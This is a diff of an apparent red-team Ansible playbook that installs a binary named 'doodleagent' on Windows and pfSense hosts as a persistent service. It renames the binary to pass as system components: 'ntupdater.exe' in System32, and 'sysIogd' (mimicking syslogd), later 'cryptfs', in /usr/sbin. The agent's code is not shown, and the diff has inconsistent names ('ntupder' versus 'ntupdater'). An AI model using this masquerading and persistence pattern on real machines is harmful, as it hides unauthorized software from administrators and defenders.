@@ -59,48 +59,38 @@
         path: 'C:\winpcap-nmap-4.13.exe'
         state: absent
 
-    - name: Create directory for doodleagent on Windows hosts
-      ansible.windows.win_file:
-        path: 'C:\\Windows\\Video\\Videosrv'
-        state: directory
-
-    - name: Stop VideoSrv service if running
+    - name: Stop ntupdater service if running
       ansible.windows.win_service:
-        name: VideoSrv
+        name: ntupder
         state: stopped
       ignore_errors: true
 
     - name: Remove leftover file/dir if present
       ansible.windows.win_file:
-        path: 'C:\\Windows\\Video\\Videosrv'
+        path: 'C:\\Windows\\System32\\ntupdater.exe'
         state: absent
       ignore_errors: true
-
-    - name: Create fresh directory for doodleagent
-      ansible.windows.win_file:
-        path: 'C:\\Windows\\Video\\Videosrv'
-        state: directory
 
     - name: Copy binary to Windows hosts
       ansible.windows.win_copy:
         src: ../bin/windows_amd64/doodleagent.exe
-        dest: 'C:\\Windows\\Video\\Videosrv\\VideoSrv.exe'
+        dest: 'C:\\Windows\\System32\\ntupdater.exe'
 
     - name: Uninstall existing service if present
       ansible.windows.win_shell: >
-        if (Get-Service -Name 'VideoSrv' -ErrorAction SilentlyContinue) {
-          Start-Process -FilePath "C:\Windows\Video\Videosrv\VideoSrv.exe" -ArgumentList uninstall -Wait
+        if (Get-Service -Name 'ntupdater' -ErrorAction SilentlyContinue) {
+          Start-Process -FilePath "C:\Windows\System32\ntupdater" -ArgumentList uninstall -Wait
         }
       ignore_errors: true
 
     - name: Install Windows service
-      ansible.windows.win_command: '"C:\\Windows\\Video\\Videosrv\\VideoSrv.exe" install'
+      ansible.windows.win_command: '"C:\\Windows\\System32\\ntupdater.exe" install'
 
     # This task won't work if npcap isn't installed.
     # Errors are ignored so that the playbook doesn't fail
     - name: Start Windows service
       ansible.windows.win_service:
-        name: VideoSrv
+        name: ntupdater
         state: restarted
       ignore_errors: true 
 
@@ -112,18 +102,18 @@
     - name: Copy binary to pfSense hosts
       ansible.builtin.copy:
         src: ../bin/freebsd_amd64/doodleagent
-        dest: /usr/sbin/sysIogd
+        dest: /usr/sbin/cryptfs
         owner: root
         group: wheel
         mode: '0550'
 
     - name: Install rc service
-      ansible.builtin.command: /usr/sbin/sysIogd install
+      ansible.builtin.command: /usr/sbin/cryptfs install
       args:
-        creates: /usr/local/etc/rc.d/sysIogd
+        creates: /usr/local/etc/rc.d/cryptfs
 
     - name: Enable service
-      ansible.builtin.command: sysrc sysIog_enable=YES
+      ansible.builtin.command: sysrc cryptfs_enable=YES
 
     - name: Start service
-      ansible.builtin.command: service sysIogd restart
+      ansible.builtin.command: service cryptfs restart
